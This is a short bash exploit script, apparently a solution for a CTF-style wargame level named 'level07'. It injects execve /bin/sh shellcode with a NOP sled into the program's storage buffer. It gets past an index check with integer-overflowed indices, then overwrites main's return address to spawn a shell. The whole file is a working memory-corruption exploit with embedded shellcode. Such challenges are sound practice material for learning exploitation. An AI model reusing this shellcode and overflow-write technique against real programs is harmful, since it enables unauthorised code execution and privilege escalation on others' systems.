#!/bin/bash

elf="/home/users/level07/level07"

sc2uint="./sc2uint"
src="./sc2uint.c"

rm /tmp/exploitpipe 2> /dev/null

if [ ! -f "$sc2uint" ]; then
    gcc -m32 "$src" -o "$sc2uint"
fi

# Empty file
> /tmp/payload

# Run the binary and capture the output into a variable
sc=$(python -c "print '\x90'*100+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")
output=$("${sc2uint}" "${sc}" "121")

# Store shellcode into storage buffer
# Iterate over the output of `sc2uint` line by line
i=0
while IFS= read -r line; do
    index="$i"
    if [ $(($i % 3)) -eq 0 ]; then
        index=$(($i + 1073741824)) # max uint / 4, some logit as with index 114
    fi
    echo -e "store\n${line}\n${index}" >> /tmp/payload
    ((i++))
done <<< "$output"

# Overwrite main return address
echo -e "store\n4294956416\n1073741938" >> /tmp/payload

# And quit so program goes to main return address
echo "quit" >> /tmp/payload

# Execute
cat /tmp/payload - | "$elf"
